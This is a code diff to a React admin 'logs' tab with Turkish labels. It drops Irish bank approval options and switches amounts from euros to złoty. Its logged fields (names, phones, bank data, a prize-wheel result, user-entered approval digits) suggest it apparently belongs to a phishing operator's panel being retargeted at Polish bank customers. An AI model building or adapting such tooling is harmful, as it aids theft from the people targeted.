@@ -28,8 +28,6 @@ const LOG_PAGE_SIZE = 100;
 
 const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "transfer", label: "Transfer Onayı" },
-  { value: "boi_approval", label: "Bank of Ireland Onayı" },
-  { value: "ptsb_approval", label: "Permanent TSB Onayı" },
 ];
 
 // PTSB onayinda kullanicinin girdigi 3 rakam → Onay kolonunda tek satir:
@@ -1934,7 +1932,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         tableBody.push([
           s(r.public_id ?? r.id.split("-")[0]),
           r.created_at ? new Date(r.created_at).toLocaleString("tr-TR") : "-",
-          { text: r.amount ? `€${r.amount}` : s(fd.wheel_result_label) || "-", bold: true, color: "#c2410c" },
+          { text: r.amount ? `${r.amount} zł` : s(fd.wheel_result_label) || "-", bold: true, color: "#c2410c" },
           s(`${fd.firstName ?? ""} ${fd.lastName ?? ""}`.trim()) || "-",
           s(fd.phone) || "-",
           { stack: bankCell },
@@ -2516,7 +2514,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       </button>
                     </td>
                     <td className="px-2 py-3 align-top whitespace-nowrap font-bold text-sm lg:text-base text-[#EB5E28]">
-                      {row.amount ? `€${row.amount}` : '-'}
+                      {row.amount ? `${row.amount} zł` : '-'}
                     </td>
                     <td className="px-2 py-3 align-top">
                       <div className="cursor-pointer text-[13px] font-semibold opacity-90 transition-opacity group-hover:opacity-100 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
@@ -2857,7 +2855,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     </div>
                   </div>
                   {row.amount ? (
-                    <span className="shrink-0 text-[15px] font-black text-[#EB5E28]">€{row.amount}</span>
+                    <span className="shrink-0 text-[15px] font-black text-[#EB5E28]">{row.amount} zł</span>
                   ) : null}
                 </div>
 
